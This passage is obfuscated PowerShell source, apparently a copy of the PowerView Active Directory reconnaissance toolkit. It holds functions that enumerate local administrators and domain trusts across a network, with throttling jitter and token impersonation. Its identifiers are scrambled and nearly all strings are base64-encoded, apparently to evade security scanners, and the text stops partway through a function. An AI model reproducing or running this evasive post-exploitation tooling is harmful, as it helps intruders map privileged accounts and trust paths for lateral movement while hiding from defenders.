            ${__/\_/\/\/\/\/\_/} = New-Object System.Random
            ForEach (${__/==\_/=\/===\/=} in ${_/=\__/=\___/=\/=}) {
                ${_/==\/\/==\/=\/==} = ${_/==\/\/==\/=\/==} + 1
                sleep -Seconds ${__/\_/\/\/\/\/\_/}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-LocalAdminAccess] Enumerating server ${__/==\_/=\/===\/=} (${_/==\/\/==\/=\/==} of $(${_/=\__/=\___/=\/=}.count))"
                icm -ScriptBlock ${____/=\/\_/\/\/\_} -ArgumentList ${__/==\_/=\/===\/=}, ${/=\_______/\/\__/}
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAAVQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwA6ACAAJABUAGgAcgBlAGEAZABzAA==')))
            ${/====\__/\_/===\/} = @{
                'TokenHandle' = ${/=\_______/\/\__/}
            }
            _/=\__/=\__/=\/==\ -____/=\/=\_/=\/\/ ${_/=\__/=\___/=\/=} -___/\/=\____/=\/\/ ${____/=\/\_/\/\/\_} -__/\/\/\/\____/\/\ ${/====\__/\_/===\/} -Threads $Threads
        }
    }
}
function Find-DomainLocalGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${____/=\/=\_/=\/\/},
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${___/===\/=\___/\/} = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${_/\/\_/==\__/=\/\} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${_/\_____/====\/===} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${_/=\_____/===\/\/=} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${___/\/\/\__/==\/=\} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${_/=\__/=\___/=\/=} = ${____/=\/=\_/=\/\/}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAUQB1AGUAcgB5AGkAbgBnACAAYwBvAG0AcAB1AHQAZQByAHMAIABpAG4AIAB0AGgAZQAgAGQAbwBtAGEAaQBuAA==')))
            ${_/=\__/=\___/=\/=} = _/==\/\/\_______/\ @_/\/\_/==\__/=\/\ | select -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainLocalGroupMember] TargetComputers length: $(${_/=\__/=\___/=\/=}.Length)"
        if (${_/=\__/=\___/=\/=}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAATgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUA')))
        }
        ${____/=\/\_/\/\/\_} = {
            Param(${____/=\/=\_/=\/\/}, ${___/===\/=\___/\/}, $Method, ${_/=\/=\_/=\/=\/\/=})
            if (${___/===\/=\___/\/} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                ${___/\/===\_/\_/\/} = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                ${___/===\/=\___/\/} = (${___/\/===\_/\_/\/}.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }
            if (${_/=\/=\_/=\/=\/\/=}) {
                $Null = _/=\/=\/==\_/=\__/ -_/=\/=\_/=\/=\/\/= ${_/=\/=\_/=\/=\/\/=} -___/==\_/\/=\_/=\_
            }
            ForEach (${__/==\_/=\/===\/=} in ${____/=\/=\_/=\/\/}) {
                ${__/==\/=\/\/\/=\/} = Test-Connection -Count 1 -Quiet -ComputerName ${__/==\_/=\/===\/=}
                if (${__/==\/=\/\/\/=\/}) {
                    ${/=\___/=\__/\__/=} = @{
                        'ComputerName' = ${__/==\_/=\/===\/=}
                        'Method' = $Method
                        'GroupName' = ${___/===\/=\___/\/}
                    }
                    _/===\_/\_/\_/==== @/=\___/=\__/\__/=
                }
            }
            if (${_/=\/=\_/=\/=\/\/=}) {
                __/\/=\/\______/\/
            }
        }
        ${/=\_______/\/\__/} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential
            }
            else {
                ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential -___/==\_/\/=\_/=\_
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainLocalGroupMember] Total number of hosts: $(${_/=\__/=\___/=\/=}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARABlAGwAYQB5ADoAIAAkAEQAZQBsAGEAeQAsACAASgBpAHQAdABlAHIAOgAgACQASgBpAHQAdABlAHIA')))
            ${_/==\/\/==\/=\/==} = 0
            ${__/\_/\/\/\/\/\_/} = New-Object System.Random
            ForEach (${__/==\_/=\/===\/=} in ${_/=\__/=\___/=\/=}) {
                ${_/==\/\/==\/=\/==} = ${_/==\/\/==\/=\/==} + 1
                sleep -Seconds ${__/\_/\/\/\/\/\_/}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainLocalGroupMember] Enumerating server ${__/==\_/=\/===\/=} (${_/==\/\/==\/=\/==} of $(${_/=\__/=\___/=\/=}.count))"
                icm -ScriptBlock ${____/=\/\_/\/\/\_} -ArgumentList ${__/==\_/=\/===\/=}, ${___/===\/=\___/\/}, $Method, ${/=\_______/\/\__/}
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwA6ACAAJABUAGgAcgBlAGEAZABzAA==')))
            ${/====\__/\_/===\/} = @{
                'GroupName' = ${___/===\/=\___/\/}
                'Method' = $Method
                'TokenHandle' = ${/=\_______/\/\__/}
            }
            _/=\__/=\__/=\/==\ -____/=\/=\_/=\/\/ ${_/=\__/=\___/=\/=} -___/\/=\____/=\/\/ ${____/=\/\_/\/\/\_} -__/\/\/\/\____/\/\ ${/====\__/\_/===\/} -Threads $Threads
        }
    }
    END {
        if (${/=\_______/\/\__/}) {
            __/\/=\/\______/\/ -_/=\/=\_/=\/=\/\/= ${/=\_______/\/\__/}
        }
    }
}
function _/==\/\___/\_/==\_ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${___/\/\/==\/\_/\/} = @{
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAE4AXwBUAFIAQQBOAFMASQBUAEkAVgBFAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBQAEwARQBWAEUATABfAE8ATgBMAFkA')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBJAEwAVABFAFIAXwBTAEkARABTAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBPAFIARQBTAFQAXwBUAFIAQQBOAFMASQBUAEkAVgBFAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAE8AUwBTAF8ATwBSAEcAQQBOAEkAWgBBAFQASQBPAE4A')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBJAFQASABJAE4AXwBGAE8AUgBFAFMAVAA=')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADQAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAEUAQQBUAF8AQQBTAF8ARQBYAFQARQBSAE4AQQBMAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADgAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAF8AVQBTAEUAUwBfAFIAQwA0AF8ARQBOAEMAUgBZAFAAVABJAE8ATgA=')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAxADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAF8AVQBTAEUAUwBfAEEARQBTAF8ASwBFAFkAUwA=')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAyADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAE8AUwBTAF8ATwBSAEcAQQBOAEkAWgBBAFQASQBPAE4AXwBOAE8AXwBUAEcAVABfAEQARQBMAEUARwBBAFQASQBPAE4A')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAA0ADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABJAE0AXwBUAFIAVQBTAFQA')))
        }
        ${/====\_/===\/\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/====\_/===\/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${/====\_/===\/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${/====\_/===\/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/====\_/===\/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/====\_/===\/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/====\_/===\/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/====\_/===\/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/====\_/===\/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/====\_/===\/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/====\_/===\/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
            ${/=\__/\/\_/=====\} = @{}
            if ($Domain -and $Domain.Trim() -ne '') {
                ${_/==\_/=\/====\_/} = $Domain
            }
            else {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                    ${_/==\_/=\/====\_/} = (____/\/\/=\/\/==\/ -Credential $Credential).Name
                }
                else {
                    ${_/==\_/=\/====\_/} = (____/\/\/=\/\/==\/).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))) {
            if ($Domain -and $Domain.Trim() -ne '') {
                ${_/==\_/=\/====\_/} = $Domain
            }
            else {
                ${_/==\_/=\/====\_/} = $Env:USERDNSDOMAIN
            }
        }
        if ($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA=')))) {
            ${/==\/\/=====\____} = __/=\/\_/\/=\__/=\ @/====\_/===\/\/\/
            ${/=\/\/==\__/\/===} = ___/\/=\/=\_/==\/= @/=\__/\/\_/=====\
            if (${/==\/\/=====\____}) {
                ${/==\/\/=====\____}.Filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQB0AHIAdQBzAHQAZQBkAEQAbwBtAGEAaQBuACkA')))
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${/==\_/=\____/===\} = ${/==\/\/=====\____}.FindOne() }
                else { ${/==\_/=\____/===\} = ${/==\/\/=====\____}.FindAll() }
                ${/==\_/=\____/===\} | ? {$_} | % {
                    ${_/\/\_/\_/\_/\_/\} = $_.Properties
                    ${_/\/\/======\___/} = New-Object PSObject
                    ${_/==\__/=\/======} = @()
                    ${_/==\__/=\/======} += ${___/\/\/==\/\_/\/}.Keys | ? { ${_/\/\_/\_/\_/\_/\}.trustattributes[0] -band $_ } | % { ${___/\/\/==\/\_/\/}[$_] }
                    ${__/\_/\/=\/\_/\/=} = Switch (${_/\/\_/\_/\_/\_/\}.trustdirection) {
                        0 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) }
                        1 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGIAbwB1AG4AZAA='))) }
                        2 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAYgBvAHUAbgBkAA=='))) }
                        3 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBpAGQAaQByAGUAYwB0AGkAbwBuAGEAbAA='))) }
                    }
                    ${/====\/\_/\__/\_/} = Switch (${_/\/\_/\_/\_/\_/\}.trusttype) {
                        1 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBJAE4ARABPAFcAUwBfAE4ATwBOAF8AQQBDAFQASQBWAEUAXwBEAEkAUgBFAEMAVABPAFIAWQA='))) }
                        2 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBJAE4ARABPAFcAUwBfAEEAQwBUAEkAVgBFAF8ARABJAFIARQBDAFQATwBSAFkA'))) }
                        3 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBJAFQA'))) }
                    }
                    ${__/\/\/=\_/=\/\_/} = ${_/\/\_/\_/\_/\_/\}.distinguishedname[0]
                    ${/=\___/\_/=\/\/=\} = ${__/\/\/=\_/=\/\_/}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))
                    if (${/=\___/\_/=\/\/=\}) {
                        ${_/==\_/=\/====\_/} = $(${__/\/\/=\_/=\/\_/}.SubString(${/=\___/\_/=\/\/=\})) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    }
                    else {
                        ${_/==\_/=\/====\_/} = ""
                    }
                    ${/=\____/\/\___/=\} = ${__/\/\/=\_/=\/\_/}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABDAE4APQBTAHkAcwB0AGUAbQA='))))
                    if (${/=\___/\_/=\/\/=\}) {
                        $TargetDomain = ${__/\/\/=\_/=\/\_/}.SubString(3, ${/=\____/\/\___/=\}-3)
                    }
                    else {
                        $TargetDomain = ""
                    }
                    ${/===\_/==\_/=====} = New-Object Guid @(,${_/\/\_/\_/\_/\_/\}.objectguid[0])
                    ${/=\_/==\__/==\/\_} = (New-Object System.Security.Principal.SecurityIdentifier(${_/\/\_/\_/\_/\_/\}.securityidentifier[0],0)).Value
                    ${_/\/\/======\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUATgBhAG0AZQA='))) ${_/==\_/=\/====\_/}
                    ${_/\/\/======\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATgBhAG0AZQA='))) ${_/\/\_/\_/\_/\_/\}.name[0]
                    ${_/\/\/======\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AFQAeQBwAGUA'))) ${/====\/\_/\__/\_/}
                    ${_/\/\/======\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEEAdAB0AHIAaQBiAHUAdABlAHMA'))) $(${_/==\__/=\/======} -join ',')
                    ${_/\/\/======\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEQAaQByAGUAYwB0AGkAbwBuAA=='))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAFwAXwAvAFwALwA9AFwALwBcAF8ALwBcAC8APQB9AA==')))
                    ${_/\/\/======\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBoAGUAbgBDAHIAZQBhAHQAZQBkAA=='))) ${_/\/\_/\_/\_/\_/\}.whencreated[0]
                    ${_/\/\/======\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBoAGUAbgBDAGgAYQBuAGcAZQBkAA=='))) ${_/\/\_/\_/\_/\_/\}.whenchanged[0]
                    ${_/\/\/======\___/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQALgBMAEQAQQBQAA=='))))
                    ${_/\/\/======\___/}
                }
